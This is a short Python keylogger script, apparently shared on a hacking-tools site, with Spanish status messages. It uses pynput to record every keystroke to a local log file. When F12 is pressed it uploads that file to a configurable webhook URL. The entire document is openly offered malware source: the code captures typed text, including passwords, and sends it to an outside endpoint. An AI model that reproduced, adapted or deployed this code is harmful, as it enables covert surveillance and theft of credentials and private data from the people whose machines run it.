#Coder by dEEpEst
#Home: level23hacktools.com
import requests
from pynput.keyboard import Key, Listener

LOG_FILE = 'log.txt'
WEBHOOK_URL = 'YOUR_WEBHOOKS_API_HERE'

def write_file(key):
    k = str(key).replace("'", "")
    
    if k == 'Key.space':
        k = ' '
    elif k == 'Key.enter':
        k = '\n'
    elif k.find("Key") >= 0:
        k = ''

    with open(LOG_FILE, 'a') as f:
        try:
            f.write(k)
        except Exception as e:
            print(f"Error al escribir el archivo: {e}")

def send_log():
    with open(LOG_FILE, 'rb') as f:
        try:
            files = {'file': (LOG_FILE, f, 'application/octet-stream')}
            response = requests.post(WEBHOOK_URL, files=files)
            print(f"Log enviado. Código de respuesta: {response.status_code}")
        except Exception as e:
            print(f"Error al enviar el log: {e}")

def on_release(key):
    if key == Key.f12:
        send_log()
        return False

with Listener(on_press=write_file, on_release=on_release) as listener:
    listener.join()
